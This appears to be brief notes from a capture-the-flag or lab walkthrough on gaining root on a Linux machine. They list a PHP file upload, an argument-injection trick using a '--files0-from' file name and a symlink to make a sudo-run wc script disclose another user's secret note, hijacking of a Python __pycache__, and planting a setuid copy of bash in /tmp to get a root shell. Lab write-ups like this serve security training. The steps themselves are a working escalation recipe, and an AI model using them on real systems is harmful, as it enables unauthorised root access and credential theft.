    Create pet with name t.php

    touch '--files0-from'
    ln -s /home/james/secret-note.txt x
    sudo -u james /home/james/totalwc.sh
    Get password, change user using su
ROOT:
    We can rename __pycache__ and add our own one
    cp /bin/bash /tmp/x
    Replace the cat /proc/cpuinfo with the following
        cp /tmp/x /tmp/y
        chmod +s /tmp/y
    Then after getting root to run those commands, we can do
    /tmp/y -p
    To get a shell with euid root
